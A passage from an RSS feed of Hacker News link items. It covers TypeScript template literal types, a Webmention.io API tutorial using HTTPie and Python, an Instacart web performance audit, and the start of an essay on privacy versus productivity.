<p>The <a href="https://github.com/codemix/ts-sql" target="_blank" rel="noopener" onclick="return trackOutboundLink('what can should you do with template literal types', 'https://github.com/codemix/ts-sql', event);">ts-sql</a> demo <a href="https://news.ycombinator.com/item?id=24615185" target="_blank" rel="noopener" onclick="return trackOutboundLink('what can should you do with template literal types', 'https://news.ycombinator.com/item?id=24615185', event);">raised some eyebrows</a>, but it also made a real point about the power of template literal types. Given a TypeScript version of your database schema (which can be generated using <a href="https://github.com/PSYT/schemats" target="_blank" rel="noopener" onclick="return trackOutboundLink('what can should you do with template literal types', 'https://github.com/PSYT/schemats', event);">schemats</a> or <a href="https://github.com/danvk/schemats" target="_blank" rel="noopener" onclick="return trackOutboundLink('what can should you do with template literal types', 'https://github.com/danvk/schemats', event);">pg-to-ts</a>), it should be possible to infer result types for a SQL query:</p>
<figure><div><pre><code><span>import</span> {Schema} <span>from</span> <span>'./dbschema'</span>;<p><span>async</span> <span><span>function</span> <span>getStudentsByAge</span>(<span>db: Pool, age: <span>number</span></span>) </span>{<br>  <span>const</span> result = <span>await</span> db.query&lt;Schema&gt;(<span>`</span><br><span>  SELECT first_name, last_name FROM students</span><br><span>  WHERE age = $1;</span><br><span>  `</span>, [age]);  <br>  <span>return</span> result.rows;<br>  <br>}</p></code></pre></div></figure>

<p>This seems potentially amazing, but also perhaps brittle. You'd have to work in the subset of SQL that your types understood: presumably you wouldn't want to implement all of <a href="https://en.wikipedia.org/wiki/PL/pgSQL" target="_blank" rel="noopener" onclick="return trackOutboundLink('what can should you do with template literal types', 'https://en.wikipedia.org/wiki/PL/pgSQL', event);">PL/pgSQL</a> in the type system. But I could imagine getting a large class of queries, including joins, to work.</p>
<p>So I'm on the fence on this one! Similar considerations apply to GraphQL queries, which would be a bit easier to join with a schema in the type system than raw SQL.</p>
</li>
</ul>
<p>Template literal types open up many new doors for TypeScript library authors and should improve the overall experience of using TypeScript for everyone by capturing more JavaScript patterns in the type system.</p>
<p>I'd like to conclude by pointing out that this is a very <em>TypeScripty</em> solution to this problem. …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://effectivetypescript.com/2020/11/05/template-literal-types/">https://effectivetypescript.com/2020/11/05/template-literal-types/</a></em></p>]]>
            </description>
            <link>https://effectivetypescript.com/2020/11/05/template-literal-types/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25059336</guid>
            <pubDate>Wed, 11 Nov 2020 15:52:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[ZX Spectrum 8-Bit Chiptune Music Collection: AY-3-8910, Beeper, Digital]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25059328">thread link</a>) | @elvis70
<br/>
November 11, 2020 | https://zxart.ee/eng/music/ | <a href="https://web.archive.org/web/*/https://zxart.ee/eng/music/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://zxart.ee/eng/music/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25059328</guid>
            <pubDate>Wed, 11 Nov 2020 15:51:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Using the Webmention.io API]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25059318">thread link</a>) | @todsacerdoti
<br/>
November 11, 2020 | https://randomgeekery.org/post/2020/11/using-the-webmentionio-api/ | <a href="https://web.archive.org/web/*/https://randomgeekery.org/post/2020/11/using-the-webmentionio-api/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><article>
    <header>
      <p>Fetching my IndieWeb mentions with HTTPie and Requests</p><section>
      <p><time datetime="2020-11-10T00:00:00+00:00">
            <a href="https://randomgeekery.org/post/2020/11/using-the-webmentionio-api/">
              Tuesday, 10 November, 2020
            </a>
          </time>— by
          <br>
        <a href="https://randomgeekery.org/post">Post</a>
        — <a href="https://randomgeekery.org/categories/tools/">Tools</a>
      
      
      
        —
        
          <a href="https://randomgeekery.org/tags/python">Python</a>
        
          <a href="https://randomgeekery.org/tags/indieweb">IndieWeb</a>
        
          <a href="https://randomgeekery.org/tags/fixing-my-site">fixing my site</a>
        
          <a href="https://randomgeekery.org/tags/site">Site</a>
        
      <br>
        Around 1,300 words, or 6 minutes of reading</p><section><p>Part 1 of 1 in the
              <a href="https://randomgeekery.org/series/fixing-my-webmentions">fixing my webmentions</a> series.</p>
          <dl></dl></section>
        

        
        
<nav>
  <section>
    <header>
      
      Previous Post
    </header>
    
      <p>
        <a href="https://randomgeekery.org/post/2020/07/tangling-code-from-hugo-content-with-raku/">Tangling code from Hugo content with Raku</a>
      </p>
      
    
  </section>
  <section>
    <header>
      Next Post
      
    </header>
    
      <p><em>You are reading the newest post</em></p>
    
  </section>
</nav>

      </section>
  
  
  
    
  

  <figure>
    <a href="https://randomgeekery.org/post/2020/11/using-the-webmentionio-api/cover.jpg">
      <img src="https://randomgeekery.org/post/2020/11/using-the-webmentionio-api/cover.jpg" alt="A spiderweb! For Webmention! Get it? Okay, yeah. Sorry.">
    </a><figcaption>A spiderweb! For Webmention! Get it? Okay, yeah. Sorry.</figcaption></figure>


    </header>
    <section>

      <p>So I hosed a local copy of my mentions feed the other month.
What’s my “mentions feed,” I hear you wondering?</p>
<p>Whenever somebody shares a reaction to something here — like, reshare, reply, mention — that reaction gets sent to <a href="https://webmention.io/">Webmention.io</a>.
There are more moving parts than that, of course.
<a href="https://brid.gy/">Bridgy</a> aggregates reactions to my announcement toots and tweets and sends those to Webmention.
It shows in my mentions feed as a reaction to site content when someone reacts to a relevant tweet.</p>
<p><em>Sometimes</em> folks even post mentions, replies, and reactions directly to the Webmention endpoint.
Mostly it’s just social media reactions, though.</p>
<p>The <a href="https://github.com/aaronpk/webmention.io#api">Webmention.io API</a> lets me gather all of these reactions.</p>
<p>Let’s acquaint ourselves with the important parts of this API.
You’ll need your API token, which can be found in the Webmention <a href="https://webmention.io/settings">Settings</a> once you sign up.</p>
<h2 id="reading-the-feed-with-httpie">Reading the feed with HTTPie</h2>
<p>I’ll use <a href="https://httpie.io/">HTTPie</a> for my little exploration.
I like the way it works.</p>
<h3 id="getting-recent-reactions">Getting recent reactions</h3>
<p>We mainly care about the mentions endpoint.
Hand it your domain and API token, and it will send you the 20 most recent responses for your site.</p>
<div><pre><code data-lang="shell">http get https://webmention.io/api/mentions.jf2 <span>domain</span><span>==</span>randomgeekery.org <span>token</span><span>==</span><span>$WEBMENTION_KEY</span>
</code></pre></div><p>HTTPie’s double-equals <code>==</code> syntax means “make a query string,” so I end up with something like this:</p>
<div><pre><code data-lang="text">https://webmention.io/api/mentions.jf2?domain=randomgeekery.org&amp;token=xxxxx
</code></pre></div><p>When <code>http</code> fetches that URL, I get back a <a href="https://www.w3.org/TR/jf2/">JF2</a> feed that looks something like this.</p>
<div><pre><code data-lang="json"><span>{</span>
    <span>"children"</span><span>:</span> <span>[</span>
        <span>{</span>
            <span>"author"</span><span>:</span> <span>{</span>
                <span>"name"</span><span>:</span> <span>"Jumpei KAWAMI"</span><span>,</span>
                <span>"photo"</span><span>:</span> <span>"https://webmention.io/avatar/…"</span><span>,</span>
                <span>"type"</span><span>:</span> <span>"card"</span><span>,</span>
                <span>"url"</span><span>:</span> <span>"https://twitter.com/junkw"</span>
            <span>},</span>
            <span>"content"</span><span>:</span> <span>{</span>
                <span>"text"</span><span>:</span> <span>"I wrote a note:\n\nI added this note from org mode…"</span>
            <span>},</span>
            <span>"published"</span><span>:</span> <span>"2020-10-25T23:32:25+00:00"</span><span>,</span>
            <span>"repost-of"</span><span>:</span> <span>"https://randomgeekery.org/note/2020/10/i-added-this-note-from-org-mode/"</span><span>,</span>
            <span>"type"</span><span>:</span> <span>"entry"</span><span>,</span>
            <span>"url"</span><span>:</span> <span>"https://twitter.com/junkw/status/1320508544601509889"</span><span>,</span>
            <span>"wm-id"</span><span>:</span> <span>887739</span><span>,</span>
            <span>"wm-private"</span><span>:</span> <span>false</span><span>,</span>
            <span>"wm-property"</span><span>:</span> <span>"repost-of"</span><span>,</span>
            <span>"wm-received"</span><span>:</span> <span>"2020-10-26T04:07:20Z"</span><span>,</span>
            <span>"wm-source"</span><span>:</span> <span>"https://brid-gy.appspot.com/repost/twitter/brianwisti/…"</span><span>,</span>
            <span>"wm-target"</span><span>:</span> <span>"https://randomgeekery.org/note/2020/10/i-added-this-note-from-org-mode/"</span>
        <span>},</span>
        <span>⋮</span>
    <span>],</span>
    <span>"name"</span><span>:</span> <span>"Webmentions"</span><span>,</span>
    <span>"type"</span><span>:</span> <span>"feed"</span>
<span>}</span>
</code></pre></div><p>What’s JF2?
It’s obviously JSON.
Maybe something to do with <a href="https://jsonfeed.org/">JSON Feed</a>?
Similar, but no.
JF2 is a JSON format for IndieWeb’s <a href="http://microformats.org/wiki/microformats2">microformats2</a>.
The mnemonic I’ve been trying to drill into my head is “JSON (micro)Formats 2.”</p>
<p>It’s not a very good mnemonic.</p>
<p>Each entry summarizes the reaction, including which of my posts they were reacting to.
That’s kind of important.
Most recently, Twitter user <a href="https://twitter.com/junkw">junkw</a> retweeted my announcement about <a href="https://randomgeekery.org/note/2020/10/i-added-this-note-from-org-mode/">adding a note from Org mode</a>.</p>
<div>
  <p>Note</p><p>

  There’s also a <code>.json</code> endpoint for every feed that presents a different structure for mentions.
I prefer it, because it contains fewer <code>wm-*</code> fields.
But the documentation uses JF2, so that’s what I’ll do.</p></div>

<h3 id="checking-for-new-reactions">Checking for new reactions</h3>
<p>Maybe I’m checking again later and only want to see the <em>new</em> reactions.
I request mentions received since the value of the <code>wm-received</code> field in the last entry I have.</p>
<div><pre><code data-lang="shell">http get https://webmention.io/api/mentions.jf2 <span>\
</span><span></span>  <span>domain</span><span>==</span>randomgeekery.org <span>\
</span><span></span>  <span>token</span><span>==</span><span>$WEBMENTION_KEY</span> <span>\
</span><span></span>  <span>since</span><span>==</span><span>"2020-10-26T04:07:20Z"</span>
</code></pre></div><div><pre><code data-lang="json"><span>{</span>
    <span>"children"</span><span>:</span> <span>[],</span>
    <span>"name"</span><span>:</span> <span>"Webmentions"</span><span>,</span>
    <span>"type"</span><span>:</span> <span>"feed"</span>
<span>}</span>
</code></pre></div><p>Well, yeah.
That makes sense.
I don’t get the kind of traffic where you’d expect fresh reactions every time you check.</p>
<h3 id="fetching-the-oldest-reactions-first">Fetching the oldest reactions first</h3>
<p>As I mentioned at the start, my site is a little broken.
I need to rebuild the full list of reactions so my <a href="https://randomgeekery.org/tags/hugo">Hugo</a> site can work with a complete record.
To do that, I should probably start from the oldest mentions and work my way forward.</p>
<p>Rather than the default <code>sort-dir</code> of <code>down</code>, I specify <code>up</code>.</p>
<div><pre><code data-lang="shell">http get https://webmention.io/api/mentions.jf2 <span>\
</span><span></span>  <span>domain</span><span>==</span>randomgeekery.org <span>\
</span><span></span>  <span>token</span><span>==</span><span>$WEBMENTION_KEY</span> <span>\
</span><span></span>  sort-dir<span>==</span>up
</code></pre></div><div><pre><code data-lang="json"><span>{</span>
    <span>"children"</span><span>:</span> <span>[</span>
        <span>{</span>
            <span>"author"</span><span>:</span> <span>{</span>
                <span>"name"</span><span>:</span> <span>"Steve Scaffidi"</span><span>,</span>
                <span>"photo"</span><span>:</span> <span>"https://webmention.io/avatar/…"</span><span>,</span>
                <span>"type"</span><span>:</span> <span>"card"</span><span>,</span>
                <span>"url"</span><span>:</span> <span>"https://twitter.com/hercynium"</span>
            <span>},</span>
            <span>"content"</span><span>:</span> <span>{</span>
                <span>"html"</span><span>:</span> <span>"This is where I wish Perl5 had something like Python's AST class hierarchy…"</span><span>,</span>
                <span>"text"</span><span>:</span> <span>"This is where I wish Perl5 had something like Python's AST class hierarchy…"</span>
            <span>},</span>
            <span>"in-reply-to"</span><span>:</span> <span>"https://randomgeekery.org/2020/02/17/python-invoke/"</span><span>,</span>
            <span>"published"</span><span>:</span> <span>"2020-02-18T03:11:58+00:00"</span><span>,</span>
            <span>"type"</span><span>:</span> <span>"entry"</span><span>,</span>
            <span>"url"</span><span>:</span> <span>"https://twitter.com/hercynium/status/1229604443651526656"</span><span>,</span>
            <span>"wm-id"</span><span>:</span> <span>757935</span><span>,</span>
            <span>"wm-private"</span><span>:</span> <span>false</span><span>,</span>
            <span>"wm-property"</span><span>:</span> <span>"in-reply-to"</span><span>,</span>
            <span>"wm-received"</span><span>:</span> <span>"2020-02-18T22:32:20Z"</span><span>,</span>
            <span>"wm-source"</span><span>:</span> <span>"https://brid-gy.appspot.com/comment/twitter/brianwisti/…"</span><span>,</span>
            <span>"wm-target"</span><span>:</span> <span>"https://randomgeekery.org/2020/02/17/python-invoke/"</span>
        <span>}</span>
    <span>],</span>
    <span>"name"</span><span>:</span> <span>"Webmentions"</span><span>,</span>
    <span>"type"</span><span>:</span> <span>"feed"</span>
<span>}</span>
</code></pre></div><p>Aww, my first site reply.
From <a href="https://twitter.com/hercynium">hercynium</a>.</p>
<p>I only get 20 results by default, though.
Here.
Let’s make <a href="https://stedolan.github.io/jq/">jq</a> show us.
Here’s a default page.</p>
<div><pre><code data-lang="shell">http get https://webmention.io/api/mentions.jf2 <span>\
</span><span></span>  <span>domain</span><span>==</span>randomgeekery.org <span>token</span><span>==</span><span>$WEBMENTION_KEY</span> sort-dir<span>==</span>up <span>\
</span><span></span>  <span>|</span> jq <span>'.children | length'</span>
</code></pre></div><pre><code>20
</code></pre><h3 id="handling-result-pagination">Handling result pagination</h3>
<p>I can specify how many responses I want in each response with the <code>per-page</code> parameter.
With <code>per-page</code> set to 100, I get a hundred entries.</p>
<div><pre><code data-lang="shell">http get https://webmention.io/api/mentions.jf2 <span>\
</span><span></span>  <span>domain</span><span>==</span>randomgeekery.org <span>token</span><span>==</span><span>$WEBMENTION_KEY</span> per-page<span>==</span><span>100</span> <span>\
</span><span></span>  <span>|</span> jq <span>'.children | length'</span>
</code></pre></div><pre><code>100
</code></pre><p>Of course, if there aren’t a hundred entries to fill the page, I only get what’s available.</p>
<div><pre><code data-lang="shell">http get https://webmention.io/api/mentions.jf2 <span>\
</span><span></span>  <span>domain</span><span>==</span>randomgeekery.org <span>token</span><span>==</span><span>$WEBMENTION_KEY</span> <span>since</span><span>==</span><span>"2020-10-26T04:07:20Z"</span> per-page<span>=</span><span>100</span> <span>\
</span><span></span>  <span>|</span> jq <span>'.children | length'</span>
</code></pre></div><pre><code>0
</code></pre><p>The <code>page</code> parameter — which starts at zero — lets me step through the feed in batches.</p>
<div><pre><code data-lang="shell">http get https://webmention.io/api/mentions.jf2 <span>\
</span><span></span>  <span>domain</span><span>==</span>randomgeekery.org <span>\
</span><span></span>  <span>token</span><span>==</span><span>$WEBMENTION_KEY</span> <span>\
</span><span></span>  sort-dir<span>==</span>up <span>\
</span><span></span>  <span>page</span><span>==</span><span>1</span>
</code></pre></div><div><pre><code data-lang="json"><span>{</span>
    <span>"children"</span><span>:</span> <span>[</span>
        <span>{</span>
            <span>"author"</span><span>:</span> <span>{</span>
                <span>"name"</span><span>:</span> <span>"brian wisti"</span><span>,</span>
                <span>"photo"</span><span>:</span> <span>"https://webmention.io/avatar/…"</span><span>,</span>
                <span>"type"</span><span>:</span> <span>"card"</span><span>,</span>
                <span>"url"</span><span>:</span> <span>"https://twitter.com/brianwisti"</span>
            <span>},</span>
            <span>"content"</span><span>:</span> <span>{</span>
                <span>"html"</span><span>:</span> <span>"…"</span><span>,</span>
                <span>"text"</span><span>:</span> <span>"…"</span><span>,</span>
            <span>},</span>
            <span>"in-reply-to"</span><span>:</span> <span>"https://randomgeekery.org/2020/01/19/restructuredtext-basics-for-blogging/"</span><span>,</span>
            <span>"published"</span><span>:</span> <span>"2020-03-10T06:24:45+00:00"</span><span>,</span>
            <span>"type"</span><span>:</span> <span>"entry"</span><span>,</span>
            <span>"url"</span><span>:</span> <span>"https://twitter.com/brianwisti/status/1237263101482823681"</span><span>,</span>
            <span>"wm-id"</span><span>:</span> <span>766993</span><span>,</span>
            <span>"wm-private"</span><span>:</span> <span>false</span><span>,</span>
            <span>"wm-property"</span><span>:</span> <span>"in-reply-to"</span><span>,</span>
            <span>"wm-received"</span><span>:</span> <span>"2020-03-10T06:38:55Z"</span><span>,</span>
            <span>"wm-source"</span><span>:</span> <span>"https://brid-gy.appspot.com/comment/twitter/brianwisti/…"</span><span>,</span>
            <span>"wm-target"</span><span>:</span> <span>"https://randomgeekery.org/2020/01/19/restructuredtext-basics-for-blogging/"</span>
        <span>},</span>
        <span>⋮</span>
    <span>],</span>
    <span>"name"</span><span>:</span> <span>"Webmentions"</span><span>,</span>
    <span>"type"</span><span>:</span> <span>"feed"</span>
<span>}</span>
</code></pre></div><p>Right.
That’s Bridgy catching a Twitter thread.
At least I can see the full conversation from my site.
Or I wil once I’m done fixing everything.</p>
<h3 id="bonus-checking-for-reactions-to-a-specific-post">Bonus: checking for reactions to a specific post</h3>
<p>I could get a JF2 feed for specific URLs on my site if I was so inclined.</p>
<div><pre><code data-lang="shell">http get https://webmention.io/api/mentions.jf2 <span>target</span><span>==</span>https://randomgeekery.org
</code></pre></div><div><pre><code data-lang="json"><span>{</span>
    <span>"children"</span><span>:</span> <span>[</span>
        <span>{</span>
            <span>"author"</span><span>:</span> <span>{</span>
                <span>"name"</span><span>:</span> <span>""</span><span>,</span>
                <span>"photo"</span><span>:</span> <span>""</span><span>,</span>
                <span>"type"</span><span>:</span> <span>"card"</span><span>,</span>
                <span>"url"</span><span>:</span> <span>""</span>
            <span>},</span>
            <span>"mention-of"</span><span>:</span> <span>"https://randomgeekery.org"</span><span>,</span>
            <span>"published"</span><span>:</span> <span>null</span><span>,</span>
            <span>"type"</span><span>:</span> <span>"entry"</span><span>,</span>
            <span>"url"</span><span>:</span> <span>"https://kevq.uk/blogroll/"</span><span>,</span>
            <span>"wm-id"</span><span>:</span> <span>796241</span><span>,</span>
            <span>"wm-private"</span><span>:</span> <span>false</span><span>,</span>
            <span>"wm-property"</span><span>:</span> <span>"mention-of"</span><span>,</span>
            <span>"wm-received"</span><span>:</span> <span>"2020-05-14T11:25:47Z"</span><span>,</span>
            <span>"wm-source"</span><span>:</span> <span>"https://kevq.uk/blogroll/"</span><span>,</span>
            <span>"wm-target"</span><span>:</span> <span>"https://randomgeekery.org"</span>
        <span>}</span>
    <span>],</span>
    <span>"name"</span><span>:</span> <span>"Webmentions"</span><span>,</span>
    <span>"type"</span><span>:</span> <span>"feed"</span>
<span>}</span>
</code></pre></div><p>I deal with my site reactions in bulk so they can be incorporated in the Hugo build.
This could be handy for JavaScript-driven update on reactions since the site was last built and pushed, though.</p>
<h2 id="rebuilding-the-local-mentions-file">Rebuilding the local mentions file</h2>
<p>Now I want to take what I learned about the API to build a local copy of my site’s mention history.
Let’s step away from HTTPie and the command line before I try something dangerous.</p>
<p>The <a href="https://requests.readthedocs.io/en/master/">requests</a> library for <a href="https://randomgeekery.org/tags/python">Python</a> can help me build one list of Webmentions.</p>
<div><pre><code data-lang="python"><span>import</span> <span>json</span>
<span>import</span> <span>os</span>
<span>import</span> <span>time</span>

<span>import</span> <span>requests</span>

<span>def</span> <span>rebuild_full_feed</span><span>(</span><span>domain</span><span>:</span> <span>str</span><span>,</span> <span>token</span><span>:</span> <span>str</span><span>,</span> <span>target_file</span><span>:</span> <span>str</span><span>)</span> <span>-&gt;</span> <span>None</span><span>:</span>
    <span>endpoint</span> <span>=</span> <span>"https://webmention.io/api/mentions.jf2"</span>
    <span>page_size</span> <span>=</span> <span>100</span>
    <span>all_entries</span> <span>=</span> <span>[]</span>
    <span>page_index</span> …</code></pre></div></section></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://randomgeekery.org/post/2020/11/using-the-webmentionio-api/">https://randomgeekery.org/post/2020/11/using-the-webmentionio-api/</a></em></p>]]>
            </description>
            <link>https://randomgeekery.org/post/2020/11/using-the-webmentionio-api/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25059318</guid>
            <pubDate>Wed, 11 Nov 2020 15:49:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Instacart Web Performance Audit]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25059265">thread link</a>) | @toddgardner
<br/>
November 11, 2020 | https://requestmetrics.com/web-performance/performance-profiling-instacart | <a href="https://web.archive.org/web/*/https://requestmetrics.com/web-performance/performance-profiling-instacart">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Grocery shopping is tedious and time consuming.  In search of a more streamlined experience, I decided to try Instacart.  Unfortunately, using their site is <em>also</em> tedious and time consuming.</p>

<!--more-->

<h2 id="common-actions-take-too-long">Common Actions Take Too Long</h2>
<p>In the video you’ll see I attempt to visit the landing page of my local grocery store and, after that loads, do a search for <em>yogurt</em>.</p>

<figure>
    <video controls="" muted="" preload="metadata">
        <source src="https://requestmetrics.com/assets/images/webperf/perf-instacart/insta-load-and-search.mp4" type="video/mp4">
    </video>
    <figcaption>Visiting a grocery store homepage and searching for items.</figcaption>
</figure>

<p>Over <strong>25</strong> seconds to perform a single load and search.  Just loading the Cub Foods “storefront” page took <strong>14</strong> seconds and <strong>154</strong> requests.</p>

<figure>
    <img src="https://requestmetrics.com/assets/images/webperf/perf-instacart/insta-total-stats.png" alt="Loading a single storefront">
    <figcaption>Network stats for loading a single storefront in Instacart.</figcaption>
</figure>

<p>On the plus side there were some very nice placeholder graphics that set the mood while I waited.</p>

<figure>
    <img src="https://requestmetrics.com/assets/images/webperf/perf-instacart/insta-placeholder.png" alt="Placeholder graphics for days">
</figure>

<h3 id="when-its-not-javascripts-fault">When it’s not JavaScript’s Fault</h3>
<p>Usually when I look at “modern” websites the main performance culprit is JavaScript.  Too many scripts doing too much rendering.  While Instacart <em>does</em> have too much JavaScript, they have a bigger problem: <strong>the server</strong>.</p>

<h4 id="the-initial-page-load-is-slow">The Initial Page Load is Slow</h4>
<p>Instacart uses some combination of server and client rendering.  On the one hand, it’s great that they don’t just load a blank page with a big spinner in the middle and wait for 20MB of JavaScript to load.</p>
<figure>
    <img src="https://requestmetrics.com/assets/images/webperf/perf-instacart/insta-slow-page.png" alt="3 seconds to load the basic page skeleton">
</figure>
<p>On the other hand it took <strong>3</strong> seconds to get the single page layout skeleton back.</p>

<figure>
    <img src="https://requestmetrics.com/assets/images/webperf/perf-instacart/insta-skeleton.png" alt="Just a basic SPA template">
    <figcaption>Three seconds for some placeholder template HTML is a bit long.</figcaption>
</figure>

<p>The images to populate the placeholder template took another few seconds:</p>

<figure>
    <img src="https://requestmetrics.com/assets/images/webperf/perf-instacart/insta-slow-image.png" alt="4 seconds for a background image">
</figure>

<p>If you notice the first segment of the URL after the Cloudfront domain is <code>/156x/</code>. These endpoints will return custom sized images and that first segment is the requested dimensions.  You can change that segment to <code>/300x/</code>, for example, and you’ll get a bigger image that maintains aspect ratio (it will be 300px wide by whatever the height should be to keep the ratio).  You can also specify a height if you want a different effect:</p>

<figure>
    <img src="https://requestmetrics.com/assets/images/webperf/perf-instacart/insta-custom-image-size.png" alt="Custom images sizes are great, but costly for performance">
</figure>

<p>Cool, but this is almost certainly part of the reason loading uncached images is so slow. The origin behind Cloudfront is doing a lot of work to make a custom image and send it over the wire on-demand.</p>

<p>In all fairness, these images have the proper cache response headers, so subsequent page loads will have the images served from the browser memory cache.  But that first hit is very slow.</p>

<h4 id="the-api-is-slow-too">The API is Slow Too</h4>
<p>It isn’t just the page load and images that are slow.  The servers responding to API requests are taking their time as well.  Some of the calls to populate data on the page took over <strong>5</strong> seconds!</p>
<figure>
    <img src="https://requestmetrics.com/assets/images/webperf/perf-instacart/insta-slow-api.png" alt="Several API calls took over 5 seconds">
</figure>

<p>One of the endpoints shown here fetches coupon information.  In the initial loading video you can see the coupon section is particularly slow to render.  Even though there is content loaded below the fold, the user has no idea since the placeholders are still shown for the coupon section until that call returns.</p>

<h4 id="placeholders-are-nice-but-faster-endpoints-are-better">Placeholders are Nice But Faster Endpoints are Better</h4>

<p>This is where the hybrid rendering model falls apart a bit.  There is a lot of dynamic content being rendered post page load.  And since the API is slow the user is getting even more placeholders.</p>

<p>As the user scrolls down the page there are on-demand API calls made to show products from each grocery department.  These calls can take upwards of 2 seconds each.  And there’s a lot of them.</p>

<figure>
    <img src="https://requestmetrics.com/assets/images/webperf/perf-instacart/insta-slow-department.png" alt="On-demand API calls to load additional products are slow.">
</figure>

<p>For each one we get more placeholder graphics until the server returns its response:</p>

<figure>
    <img src="https://requestmetrics.com/assets/images/webperf/perf-instacart/insta-more-placeholders.png" alt="Placeholders are cool, but speed would be better.">
</figure>

<p>Placeholders do a nice job of minimizing jank or <a href="https://requestmetrics.com/web-performance/cumulative-layout-shift">cumulative layout shift</a> but they are a poor substitute for the actual content.  Paradoxically I find they can also make a site feel slower since the UI is changing out from under the user so frequently.</p>

<h3 id="maybe-instacart-doesnt-think-it-has-a-performance-problem">Maybe Instacart Doesn’t Think It Has a Performance Problem?</h3>
<p>There’s a <a href="https://tech.instacart.com/building-instacarts-view-model-api-part-1-why-view-model-4362f64ffd2a">few articles</a> on <a href="https://tech.instacart.com/scaling-at-instacart-distributing-data-across-multiple-postgres-databases-with-rails-13b1e4eba202">the Instacart engineering blog</a> discussing the back-end technical implementation of the site.  In both the linked articles they discuss “improved performance” and the existing “healthy performance” of the site.  Perhaps the main problem is they don’t think there’s a performance issue to fix?</p>

<p>Most modern technical stacks are capable of serving pages and API calls in sub-second time if that’s the company’s goal.  I suspect in this case they have limited resources and other priorities.  Maybe things are better in the phone app, but I think I’ll stick with going to the grocery store for now, it’s faster.</p>

</div></div>]]>
            </description>
            <link>https://requestmetrics.com/web-performance/performance-profiling-instacart</link>
            <guid isPermaLink="false">hacker-news-small-sites-25059265</guid>
            <pubDate>Wed, 11 Nov 2020 15:44:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Productivity vs. Privacy]]>
            </title>
            <description>
<![CDATA[
Score 49 | Comments 14 (<a href="https://news.ycombinator.com/item?id=25059205">thread link</a>) | @jessems
<br/>
November 11, 2020 | https://jessems.com/productivity-vs-privacy | <a href="https://web.archive.org/web/*/https://jessems.com/productivity-vs-privacy">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><div><p>In recent years there's been a steady growth in privacy focused companies. Some examples that have reached large-scale adoption are <a href="https://protonmail.com/">ProtonMail</a>, <a href="https://signal.com/">Signal</a>, and <a href="https://duckduckgo.com/">DuckDuckGo</a>. These are companies that have put privacy front and center to their value proposition and can be considered <em>privacy-preserving products</em>. I've come to beleive a goal of preserving user privacy is often inherently in tension with the goal of advancing user productivity.</p><p>What these services have in common is that they promise their users a higher degree of privacy relative to their competitors. Instead of the usual encryption in transit (protection from eavesdroppers) and encryption at rest (protection against unauthorized users), services like Signal and ProtonMail enable their users to hide data from anyone except the intended recipient, which — crucially — includes the service providers themselves.</p><p>This category of encryption is known as end-to-end encryption (e2e) and has found adopters in anyone from principled libertarians to journalists and human rights activitists whose lives may depend on their conversations remaining unwiretapped.</p><h2>Early privacy-preserving software was too difficult to use</h2><p>The canonical implementation of e2e for email is known as Pretty Good Privacy (PGP) and its reference implementation is GPG. GPG never reached mass adoption and there seems to be a myriad of reasons for that. The most salient reason, however, seems to be that to this day, it continues to be difficult to use. As the founder of Signal, Moxie Marlinspike <a href="https://moxie.org/2015/02/24/gpg-and-me.html">explains</a>, the spirit behind GPG was the following:</p><blockquote><p>Instead of developing opinionated software with a simple interface, GPG was written to be as powerful and flexible as possible.</p></blockquote><p>Powerful, flexible software written by nerds, unfortunately also tends to be prohibitively complex for normal users. Combined with the fact that <a href="https://signal.org/blog/the-ecosystem-is-moving/">decentralized technology seems unable to quickly adapt to change</a>, the result has been a clunky solution that has, quite frankly, stayed clunky. With no feasible privacy-preserving alternative <!-- -->[1]<!-- -->, non-privacy preserving email providers became the norm.</p><h2>Surveillance capitalist companies will not encrypt your data, because they rely on being able to read it</h2><p>One such email provider, Gmail by Google, gained millions of users by offering a free plan. Their initial monetization strategy was scanning your emails and serving you personalized ads. Although they've stopped personalizing the ads, they're still scanning your email's contents to serve you a better experience across their services. Similarly, Facebook tracks what you do to shape your experience and keep you glued (they would say 'engaged') to their platform.</p><p>What unites platforms like Google and Facebook, is described by Professor Shoshana Zuboff as “<a href="https://en.wikipedia.org/wiki/Surveillance_capitalism">surveillance capitalism</a>”. The business model of surveillance capitalist companies is to harvest personal data about you to build a model that predicts your behavior. These prediction models are packaged and sold as advertisement opportunities to companies eager to buy your attention. You might be the user, but you're not the customer — the advertisers are.</p><p>It should come as no surprise then, that none of these platforms has shipped with end-to-end encryption by default. Doing so would go against the incentives that undergird their very business model. Their ability to predict your behavior, and sell ads based on those predictions, hinges on their ability to harvest your data.</p><h2>Data is also collected to improve the service</h2><p>A company like Google has other business models of course. Google Workspace, aimed at businesses, is a collection of collaboration and productivity tools. This ranges from Google Docs, to chat, to video conferencing, and more. By offering this as a paid service, Google exposes itself to a different incentive, one where the customer and the user are now one and the same.</p><p>Even if you're both the user and the customer, your data is still being harvested. This data might not feed into personalized ads (because that’s no longer the primary business model) but rather into improving your experience. But as a business user, when does your experience improve? And as a service provider, how do you know what improves the experience?</p><h2>Improvements are productivity gains</h2><p>There's an inclination to think of improvements as things that help you do the thing you want to do quicker, better and/or with less frustration. We can go one step further and borrow some of the thinking used in economics and treat productivity simply as the ratio between outputs (salaries and corporate profits) and inputs (hours worked). Productivity increases if inputs can be decreased (for equal outputs) or outputs can be increased (for equal inputs). What's more, we would expect this quantity to improve along with advances in technology.</p><p>How does technology lead to increases in productivity? One obvious way is by making us more efficient. If some new technology saves us time doing a certain task 